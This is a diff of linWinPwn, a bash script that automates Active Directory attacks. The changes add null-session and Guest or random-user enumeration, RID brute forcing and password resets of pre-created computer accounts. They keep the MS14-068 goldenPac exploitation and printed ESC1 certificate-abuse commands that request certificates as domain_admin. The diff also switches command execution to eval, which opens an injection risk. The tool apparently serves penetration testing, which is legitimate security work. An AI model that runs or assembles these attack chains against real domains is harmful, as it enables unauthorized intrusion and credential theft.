@@ -127,7 +127,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.8 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.9 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -172,11 +172,11 @@ while test $# -gt 0; do
             --domain) domain="${2}"; shift;;
             -u) user="${2}"; shift;; #leave empty for anonymous login
             --user) user="${2}"; shift;; #leave empty for anonymous login
-            -p) password="${2}"; pass_bool=true; shift;; #password
-            -H) hash="${2}"; hash_bool=true; shift;; #NTLM hash
-            -K) krb5cc="${2}"; kerb_bool=true; shift;; #location of krb5cc ticket
-            -A) aeskey="${2}"; aeskey_bool=true; shift;; #AES Key (128 or 256 bits)
-            -C) pfxcert="${2}"; cert_bool=true; shift;; #location of PFX certificate
+            -p) password="${2}"; if [ ! "${password}" == "" ]; then pass_bool=true; fi ; shift;; #password
+            -H) hash="${2}"; if [ ! "${hash}" == "" ]; then hash_bool=true; fi ; shift;; #NTLM hash
+            -K) krb5cc="${2}"; if [ ! "${krb5cc}" == "" ]; then kerb_bool=true; fi ; shift;; #location of krb5cc ticket
+            -A) aeskey="${2}"; if [ ! "${aeskey}" == "" ]; then aeskey_bool=true; fi ; shift;; #AES Key (128 or 256 bits)
+            -C) pfxcert="${2}"; if [ ! "${pfxcert}" == "" ]; then cert_bool=true; fi ; shift;; #location of PFX certificate
             --cert-pass) pfxpass="${2}"; shift;; #Password of PFX certificate
             -o) output_dir="$(realpath ${2})"; shift;;
             --output) output_dir="$(realpath ${2})"; shift;;
@@ -199,7 +199,7 @@ set -- "${args[@]}"
 
 run_command () {
     echo "$(date +%Y-%m-%d\ %H:%M:%S); $@" >> $command_log
-    $@
+    eval "$@"
 }
 
 prepare (){
@@ -338,67 +338,31 @@ prepare (){
 }
 
 authenticate (){
-    #Check if null session is used
-    if [ "${user}" == "" ] && [ "${password}" == "" ] && [ "${hash}" == "" ] && [ "${krb5cc}" == "" ] && [ "${aeskey}" == "" ]; then
+    #Check if null session or empty password is used
+    if [ "${user}" == "" ] && [ "${password}" == "" ] && [ "${hash}" == "" ] && [ "${krb5cc}" == "" ] && [ "${aeskey}" == "" ] && [ "${pfxcert}" == "" ]; then
         nullsess_bool=true
-        argument_ne="-d ${domain}"
-        argument_imp="${domain}/"
-        argument_imp_gp="${domain}/"
-        argument_smbmap=""
-        argument_ldeep="-d ${dc_domain} -a"
-        argument_pre2k="-d ${domain}"
+        rand_user=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 10; echo)
+        argument_ne="-d ${domain} -u '' -p ''"
+        argument_smbmap="-d ${domain} -u '' -p ''"
         argument_manspider="-d ${domain} -u '' -p ''"
         argument_coercer="-d ${domain} -u '' -p ''"
         argument_bloodyad="-d ${domain} -u '' -p ''"
         argument_privexchange="-d ${domain} -u '' -p ''"
+        argument_windap="-d ${domain}"
+        argument_adidns=""
+        argument_ldd=""
+        argument_silenthd=""
+        argument_enum4linux=""
+        argument_imp="${domain}/"
+        argument_imp_gp="${domain}/"
+        argument_ldeep="-d ${dc_domain} -a"
+        argument_pre2k="-d ${domain}"
         auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}null session ${NC}"
-    
+
     #Check if username is not provided
     elif [ "${user}" == "" ]; then
         echo -e "${RED}[i]${NC} Please specify username and try again..."
         exit 1
-    
-    #Check if empty password is used
-    elif [ "${password}" == "" ] && [ "${hash}" == "" ] && [ "${krb5cc}" == "" ] && [ "${aeskey}" == "" ] && [ "${pfxcert}" == "" ]; then
-        argument_ne="-d ${domain} -u ${user}"
-        argument_imp="${domain}/${user}:''" 
-        argument_imp_gp="${domain}/${user}:''" 
-        argument_bhd="-u ${user}@${domain} -p ''"
-        argument_enum4linux="-w ${domain} -u ${user} -p ''"
-        argument_adidns="-u ${domain}\\${user} -p ''"
-        argument_ldd="-u ${domain}\\${user} -p ''"
-        argument_smbmap="-d ${domain} -u ${user} -p ''"
-        argument_certi_py="${domain}/${user}:''"
-        argument_certipy="-u ${user}@${domain} -p ''"
-        argument_ldeep="-d ${domain} -u ${user} -p '' -a"
-        argument_pre2k="-d ${domain} -u ${user} -p ''"
-        argument_certsync="-d ${domain} -u ${user} -p ''"
-        argument_donpapi="${domain}/${user}:''"
-        argument_hekatomb="${domain}/${user}:''"
-        argument_silenthd="-u ${domain}\\${user} -p ''"
-        argument_windap="-d ${domain} -u ${user} -p ''"
-        argument_targkerb="-d ${domain} -u ${user} -p ''"
-        argument_p0dalirius="-d ${domain} -u ${user} -p ''"
-        argument_manspider="-d ${domain} -u ${user} -p ''"
-        argument_coercer="-d ${domain} -u ${user} -p ''"
-        argument_bloodyad="-d ${domain} -u ${user} -p ''"
-        argument_aced="${domain}/${user}:''"
-        argument_sccm="-d ${domain}"
-        argument_ldapper="-D ${domain} -U ${user} -P ''"
-        argument_adalanche="--authmode ntlm --username ${user}@${domain} --password '!'"
-        argument_mssqlrelay="-u ${user}@${domain} -p ''"
-        argument_pygpoabuse="${domain}/${user}:''"
-        argument_GPOwned="-d ${domain} -u ${user} -p ''"
-        argument_privexchange="-d ${domain} -u ${user} -p ''"
-        argument_adpeas="-d ${domain} -u ${user} -p ''"
-        pass_bool=false
-        hash_bool=false
-        kerb_bool=false
-        unset KRB5CCNAME
-        aeskey_bool=false
-        cert_bool=false
-        auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}${user} with empty password ${NC}"
-    
     fi
 
     if [ "${pass_bool}" == true ] ; then
@@ -406,19 +370,19 @@ authenticate (){
         argument_imp="${domain}/${user}:${password}"
         argument_imp_gp="${domain}/${user}:${password}"
         argument_imp_ti="-user ${user} -password ${password} -domain ${domain}"
-        argument_bhd="-u ${user}@${domain} -p ${password} --auth-method ntlm"
+        argument_bhd="-u ${user}\\@${domain} -p ${password} --auth-method ntlm"
         argument_enum4linux="-w ${domain} -u ${user} -p ${password}"
-        argument_adidns="-u ${domain}\\${user} -p ${password}"
-        argument_ldd="-u ${domain}\\${user} -p ${password}"
+        argument_adidns="-u ${domain}\\\\${user} -p ${password}"
+        argument_ldd="-u ${domain}\\\\${user} -p ${password}"
         argument_smbmap="-d ${domain} -u ${user} -p ${password}"
         argument_certi_py="${domain}/${user}:${password}"
-        argument_certipy="-u ${user}@${domain} -p ${password}"
+        argument_certipy="-u ${user}\\@${domain} -p ${password}"
         argument_ldeep="-d ${domain} -u ${user} -p ${password}"
         argument_pre2k="-d ${domain} -u ${user} -p ${password}"
         argument_certsync="-d ${domain} -u ${user} -p ${password}"
         argument_donpapi="${domain}/${user}:${password}"
         argument_hekatomb="${domain}/${user}:${password}"
-        argument_silenthd="-u ${domain}\\${user} -p ${password}"
+        argument_silenthd="-u ${domain}\\\\${user} -p ${password}"
         argument_windap="-d ${domain} -u ${user} -p ${password}"
         argument_targkerb="-d ${domain} -u ${user} -p ${password}"
         argument_p0dalirius="-d ${domain} -u ${user} -p ${password}"
@@ -428,8 +392,8 @@ authenticate (){
         argument_aced="${domain}/${user}:${password}"
         argument_sccm="-d ${domain} -u ${user} -p ${password}"
         argument_ldapper="-D ${domain} -U ${user} -P ${password}"
-        argument_adalanche="--authmode ntlm --username ${user}@${domain} --password ${password}"
-        argument_mssqlrelay="-u ${user}@${domain} -p ${password}"
+        argument_adalanche="--authmode ntlm --username ${user}\\@${domain} --password ${password}"
+        argument_mssqlrelay="-u ${user}\\@${domain} -p ${password}"
         argument_pygpoabuse="${domain}/${user}:${password}'"
         argument_GPOwned="-d ${domain} -u ${user} -p ${password}"
         argument_privexchange="-d ${domain} -u ${user} -p ${password}"
@@ -469,18 +433,18 @@ authenticate (){
                 argument_imp=" -hashes ${hash} ${domain}/${user}"
                 argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
                 argument_imp_ti="-user ${user} -hashes ${hash} -domain ${domain}"
-                argument_bhd="-u ${user}@${domain} --hashes ${hash} --auth-method ntlm"
+                argument_bhd="-u ${user}\\@${domain} --hashes ${hash} --auth-method ntlm"
                 argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 34 65)"
-                argument_adidns="-u ${domain}\\${user} -p ${hash}"
-                argument_ldd="-u ${domain}\\${user} -p ${hash}"
+                argument_adidns="-u ${domain}\\\\${user} -p ${hash}"
+                argument_ldd="-u ${domain}\\\\${user} -p ${hash}"
                 argument_smbmap="-d ${domain} -u ${user} -p ${hash}"
                 argument_certi_py="${domain}/${user} --hashes ${hash}"
-                argument_certipy="-u ${user}@${domain} -hashes ${hash}"
+                argument_certipy="-u ${user}\\@${domain} -hashes ${hash}"
                 argument_pre2k="-d ${domain} -u ${user} -hashes ${hash}"
                 argument_certsync="-d ${domain} -u ${user} -hashes ${hash}"
                 argument_donpapi=" -H ${hash} ${domain}/${user}"
                 argument_hekatomb="-hashes ${hash} ${domain}/${user}"
-                argument_silenthd="-u ${domain}\\${user} --hashes ${hash}"
+                argument_silenthd="-u ${domain}\\\\${user} --hashes ${hash}"
                 argument_windap="-d ${domain} -u ${user} --hash ${hash}"
                 argument_targkerb="-d ${domain} -u ${user} -H ${hash}"
                 argument_p0dalirius="-d ${domain} -u ${user} -H $(expr substr $hash 34 65)"
@@ -491,8 +455,8 @@ authenticate (){
                 argument_ldapper="-D ${domain} -U ${user} -P ${hash}"
                 argument_ldeep="-d ${domain} -u ${user} -H ${hash}"
                 argument_bloodyad="-d ${domain} -u ${user} -p ${hash}"
-                argument_adalanche="--authmode ntlmpth --username ${user}@${domain} --password ${hash}"
-                argument_mssqlrelay="-u ${user}@${domain} -hashes ${hash}"
+                argument_adalanche="--authmode ntlmpth --username ${user}\\@${domain} --password ${hash}"
+                argument_mssqlrelay="-u ${user}\\@${domain} -hashes ${hash}"
                 argument_pygpoabuse=" -hashes ${hash} ${domain}/${user}"
                 argument_GPOwned="-d ${domain} -u ${user} -hashes ${hash}"
                 argument_privexchange="-d ${domain} -u ${user} --hashes ${hash}"
@@ -524,9 +488,9 @@ authenticate (){
             export KRB5CCNAME=$(realpath $krb5cc)
             argument_imp="-k -no-pass ${domain}/${user}"
             argument_enum4linux="-w ${domain} -u ${user} -K ${krb5cc}"
-            argument_bhd="-u ${user}@${domain} -k -no-pass -p '' --auth-method kerberos"
+            argument_bhd="-u ${user}\\@${domain} -k -no-pass -p '' --auth-method kerberos"
             argument_certi_py="${domain}/${user} -k --no-pass"
-            argument_certipy="-u ${user}@${domain} -k -no-pass -target ${dc_FQDN}"
+            argument_certipy="-u ${user}\\@${domain} -k -no-pass -target ${dc_FQDN}"
             argument_ldeep="-d ${domain} -u ${user} -k"
             argument_pre2k="-d ${domain} -u ${user} -k -no-pass"
             argument_certsync="-d ${domain} -u ${user} -use-kcache -no-pass -k"
@@ -536,7 +500,7 @@ authenticate (){
             argument_bloodyad="-d ${domain} -u ${user} -k"
             argument_aced="-k -no-pass ${domain}/${user}"
             argument_sccm="-d ${domain} -u ${user} -k --no-pass"
-            argument_mssqlrelay="-u ${user}@${domain} -k -no-pass"
+            argument_mssqlrelay="-u ${user}\\@${domain} -k -no-pass"
             argument_pygpoabuse="${domain}/${user} -k -ccache $(realpath $krb5cc)"
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Kerberos Ticket of $user located at $(realpath $krb5cc)${NC}"
         else
@@ -553,9 +517,9 @@ authenticate (){
         target_servers=${servers_hostname_list}
         argument_ne="-d ${domain} -u ${user} --aesKey ${aeskey}"
         argument_imp="-aesKey ${aeskey} ${domain}/${user}"
-        argument_bhd="-u ${user}@${domain} -aesKey ${aeskey} --auth-method kerberos"
+        argument_bhd="-u ${user}\\@${domain} -aesKey ${aeskey} --auth-method kerberos"
         argument_certi_py="${domain}/${user} --aes ${aeskey} -k"    
-        argument_certipy="-u ${user}@${domain} -aes ${aeskey} -target ${dc_FQDN}"
+        argument_certipy="-u ${user}\\@${domain} -aes ${aeskey} -target ${dc_FQDN}"
         argument_pre2k="-d ${domain} -u ${user} -aes ${aeskey} -k"
         argument_certsync="-d ${domain} -u ${user} -aesKey ${aeskey} -k"
         argument_donpapi="-k -aesKey ${aeskey} ${domain}/${user}"
@@ -563,7 +527,7 @@ authenticate (){
         argument_p0dalirius="-d ${domain} -u ${user} --aes-key ${aeskey} -k"
         argument_aced="-aes ${aeskey} ${domain}/${user}"
         argument_sccm="-d ${domain} -u ${user} -aes ${aeskey}"
-        argument_mssqlrelay="-u ${user}@${domain} -aes ${aeskey} -k"
+        argument_mssqlrelay="-u ${user}\\@${domain} -aes ${aeskey} -k"
         pass_bool=false
         hash_bool=false
         kerb_bool=false
@@ -574,25 +538,50 @@ authenticate (){
     fi
 
     if [ "${nullsess_bool}" == false ] ; then
-        auth_check=$(${netexec} smb ${target} ${argument_ne} 2>&1| grep "\[-\]\|Traceback" -A 10)
+        auth_check=$(run_command "${netexec} smb ${target} ${argument_ne}" 2>&1| grep "\[-\]\|Traceback" -A 10 2>&1)
         if [ ! -z "$auth_check" ] ; then
             echo $auth_check
-            if [[ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ]]; then
+            if [ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ] || [ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]; then
                 if [ ! -f "${impacket_smbpasswd}" ] ; then
                     echo -e "${RED}[-] smbpasswd.py not found! Please verify the installation of impacket${NC}"
                 elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
                     echo -e "${PURPLE}[-] smbpasswd does not support kerberos authentication${NC}"
                 else
-                    echo -e "${BLUE}[*] Changing expired password of own user. Please specify new password:${NC}"
                     pass_passchange=""
-                    read -p ">> " pass_passchange </dev/tty
-                    while [ "${pass_passchange}" == "" ] ; do
-                        echo -e "${RED}Invalid password.${NC} Please specify password:"
+                    if [ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ]; then
+                        echo -e "${BLUE}[*] Changing expired password of own user. Please specify new password:${NC}"
                         read -p ">> " pass_passchange </dev/tty
-                    done
-                    echo -e "${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}"
-                    run_command "${impacket_smbpasswd} ${argument_imp}@${dc_ip} -newpass ${pass_passchange}" | tee -a ${output_dir}/Modification/impacket_smbpasswd_${dc_domain}.txt
-                    password=$pass_passchange
+                        while [ "${pass_passchange}" == "" ] ; do
+                            echo -e "${RED}Invalid password.${NC} Please specify password:"
+                            read -p ">> " pass_passchange </dev/tty
+                        done
+                        echo -e "${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}"
+                        run_command "${impacket_smbpasswd} ${argument_imp}\\@${dc_ip} -newpass ${pass_passchange}" | tee -a ${output_dir}/Modification/impacket_smbpasswd_${dc_domain}.txt
+                    elif [ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]; then
+                        echo -e "${BLUE}[*] Changing password of pre created computer account. Please specify new password:${NC}"
+                        read -p ">> " pass_passchange </dev/tty
+                        while [ "${pass_passchange}" == "" ] ; do
+                            echo -e "${RED}Invalid password.${NC} Please specify password:"
+                            read -p ">> " pass_passchange </dev/tty
+                        done
+                        authuser_passchange=""
+                        echo -e "${BLUE}[*] Please specify username for RPC authentication:${NC}"
+                        read -p ">> " authuser_passchange </dev/tty
+                        while [ "${pass_passchange}" == "" ] ; do
+                            echo -e "${RED}Invalid username.${NC} Please specify username:"
+                            read -p ">> " authuser_passchange </dev/tty
+                        done
+                        authpass_passchange=""
+                        echo -e "${BLUE}[*] Please specify password for RPC authentication:${NC}"
+                        read -p ">> " authpass_passchange </dev/tty
+                        while [ "${pass_passchange}" == "" ] ; do
+                            echo -e "${RED}Invalid password.${NC} Please specify password:"
+                            read -p ">> " authpass_passchange </dev/tty
+                        done
+                        echo -e "${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}"
+                        run_command "${impacket_smbpasswd} ${argument_imp}\\@${dc_ip} -newpass ${pass_passchange} -altuser ${authuser_passchange} -altpass ${authpass_passchange}" | tee -a ${output_dir}/Modification/impacket_smbpasswd_${dc_domain}.txt
+                    fi
+                    password="${pass_passchange}"
                     auth_check=""
                     authenticate
                 fi
@@ -790,9 +779,7 @@ ldapdomaindump_enum () {
         if [ -n "$(ls -A ${output_dir}/DomainRecon/LDAPDomainDump/ 2>/dev/null | grep -v 'ldd_output')" ] ; then
             echo -e "${YELLOW}[i] ldapdomaindump results found, skipping... ${NC}"
         else
-            if [ "${nullsess_bool}" == true ] ; then
-                run_command "${ldapdomaindump} ldap://${dc_ip} -o ${output_dir}/DomainRecon/LDAPDomainDump" 2>&1 | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
-            elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
+            if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
                 echo -e "${PURPLE}[-] ldapdomaindump does not support kerberos authentication ${NC}"
             else
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="ldaps"; else ldaps_param="ldap"; fi
@@ -814,22 +801,18 @@ enum4linux_enum () {
         echo -e "${BLUE}[*] enum4linux Enumeration${NC}"
         if [ "${aeskey_bool}" == true ] ; then
             echo -e "${PURPLE}[-] enum4linux does not support kerberos authentication using AES Key${NC}"
-        elif [ "${nullsess_bool}" == true ] ; then
-            echo -e "${CYAN}[*] Empty username/password${NC}"
-            run_command "${enum4linux_py} -A ${target}" -oJ ${output_dir}/DomainRecon/enum4linux_null_${dc_domain} 2>&1 > ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.txt
-            head -n 20 ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.txt 2>&1
-            echo -e "............................(truncated output)"
-            /usr/bin/jq -r ".users[].username" ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_enum4linux_nullsess_${dc_domain}.txt
-            echo -e "${CYAN}[*] Guest with empty password${NC}"
-            run_command "${enum4linux_py} -A ${target} -u 'Guest' -p ''" -oJ ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}  > ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt
-            head -n 20 ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt 2>&1
-            echo -e "............................(truncated output)"
-            /usr/bin/jq -r ".users[].username" ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_enum4linux_guest_${dc_domain}.txt
         else
             run_command "${enum4linux_py} -A ${argument_enum4linux} ${target}" -oJ ${output_dir}/DomainRecon/enum4linux_${dc_domain} > ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt
             head -n 20 ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>&1
             echo -e "............................(truncated output)"
             /usr/bin/jq -r ".users[].username" ${output_dir}/DomainRecon/enum4linux_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_enum4linux_${dc_domain}.txt
+            if [ "${nullsess_bool}" == true ] ; then
+                echo -e "${CYAN}[*] Guest with empty password (null session)${NC}"
+                run_command "${enum4linux_py} -A ${target} -u 'Guest' -p ''" -oJ ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}  > ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt
+                head -n 20 ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt 2>&1
+                echo -e "............................(truncated output)"
+                /usr/bin/jq -r ".users[].username" ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_enum4linux_guest_${dc_domain}.txt
+            fi
         fi
         parse_users
     fi
@@ -846,6 +829,8 @@ ne_smb_enum () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${BLUE}[*] Users Enumeration (RPC Null session)${NC}"
         run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} smb ${target} -u Guest -p '' --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
         /bin/cat ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt 2>/dev/null | grep -v "\[-\|\[+\|\[\*" | grep SMB | sed 's/[ ][ ]*/ /g' | cut -d " " -f 10 | cut -d "\\" -f 2 > ${output_dir}/DomainRecon/Users/users_list_ne_smb_nullsess_${dc_domain}.txt 2>&1
         count=$(cat ${output_dir}/DomainRecon/Users/users_list_ne_smb_nullsess_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
         echo -e "${GREEN}[+] Found ${count} users using RPC User Enum${NC}"
@@ -869,6 +854,8 @@ ne_ldap_enum () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${BLUE}[*] Users Enumeration (LDAP Null session)${NC}"
         run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} ldap ${target} -u Guest -p '' ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} ldap ${target} -u ${rand_user} -p '' ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
         /bin/cat ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt 2>/dev/null | grep -v "\[-\|\[+\|\[\*" | grep LDAP | sed 's/[ ][ ]*/ /g' | cut -d " " -f 10 > ${output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_${dc_domain}.txt 2>&1
         count=$(cat ${output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
         echo -e "${GREEN}[+] Found ${count} users using LDAP User Enum${NC}"
@@ -1223,13 +1210,17 @@ GPOwned_enum () {
 }
 
 ldap_console () {
-    if [ ! -f "${FindUncommonShares}" ]; then
+    if [ ! -f "${ldapconsole}" ]; then
         echo -e "${RED}[-] Please verify the installation of ldapconsole${NC}"
     else
         echo -e "${BLUE}[*] Launching ldapconsole${NC}"
-        if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
-        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-debug"; else verbose_p0dalirius=""; fi
-        run_command "${ldapconsole} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1 | tee -a ${output_dir}/DomainRecon/ldapconsole_output_${dc_domain}.txt
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] ldapconsole requires credentials ${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
+            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-debug"; else verbose_p0dalirius=""; fi
+            run_command "${ldapconsole} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1 | tee -a ${output_dir}/DomainRecon/ldapconsole_output_${dc_domain}.txt
+        fi
     fi
     echo -e ""
 }
@@ -1239,9 +1230,13 @@ ldap_monitor () {
         echo -e "${RED}[-] Please verify the installation of pyLDAPmonitor${NC}"
     else
         echo -e "${BLUE}[*] Launching pyLDAPmonitor${NC}"
-        if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
-        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
-        run_command "${pyLDAPmonitor} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] pyLDAPmonitor requires credentials ${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
+            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
+            run_command "${pyLDAPmonitor} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1
+        fi
     fi
     echo -e ""
 }
@@ -1255,7 +1250,7 @@ aced_console (){
         else
             echo -e "${BLUE}[*] Launching aced${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
-            run_command "$(which python3) ${aced} ${argument_aced}@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/DomainRecon/aced_output_${dc_domain}.txt
+            run_command "$(which python3) ${aced} ${argument_aced}\\@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/DomainRecon/aced_output_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -1383,7 +1378,7 @@ adcs_vuln_parse (){
         for vulntemp in $esc1_vuln; do
             echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas} > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas} > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip} -key-size 4096"
             echo -e "${CYAN}2. Authenticate using pfx of domain_admin or DC:${NC}"
             echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}"
         done
@@ -1643,9 +1638,11 @@ certsync_ntds_dump () {
 ridbrute_attack () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
-        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --rid-brute" 2>&1 > ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt
+        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --rid-brute" 2>&1 >> ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt
+        run_command "${netexec} ${ne_verbose} smb ${target} -u Guest -p '' --rid-brute" 2>&1 >> ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt
+        run_command "${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --rid-brute" 2>&1 >> ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt
         #Parsing user lists
-        /bin/cat ${output_dir}/BruteForce/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt 2>&1
+        /bin/cat ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sort -u | sed "s/ (SidTypeUser)//g" > ${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt 2>&1
         count=$(wc -l ${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt | cut -d " " -f 1)
         echo -e "${GREEN}[+] Found ${count} users using RID Brute Force${NC}"
         parse_users
@@ -1734,7 +1731,7 @@ pre2k_check () {
             if [ ! -s "${servers_hostname_list}" ] ; then
                 echo -e "${PURPLE}[-] No computers found! Please re-run computers enumeration and try again..${NC}"
             else
-                run_command "${pre2k} unauth ${argument_pre2k} -dc-ip ${dc_ip} -inputfile ${servers_hostname_list} -outputfile ${pre2k_outputfile}" | tee "${output_dir}/BruteForceF/pre2k_output_${dc_domain}.txt"
+                run_command "${pre2k} unauth ${argument_pre2k} -dc-ip ${dc_ip} -inputfile ${servers_hostname_list} -outputfile ${pre2k_outputfile}" | tee "${output_dir}/BruteForce/pre2k_output_${dc_domain}.txt"
             fi
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
@@ -1897,7 +1894,7 @@ ms14-068_check () {
         if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
             echo -e "${PURPLE}[-] MS14-068 requires credentials and does not support kerberos authentication${NC}"
         else
-            run_command "${impacket_goldenPac} ${argument_imp_gp}@${dc_FQDN} None -target-ip ${dc_ip}" 2>&1 | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt
+            run_command "${impacket_goldenPac} ${argument_imp_gp}\\@${dc_FQDN} None -target-ip ${dc_ip}" 2>&1 | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt
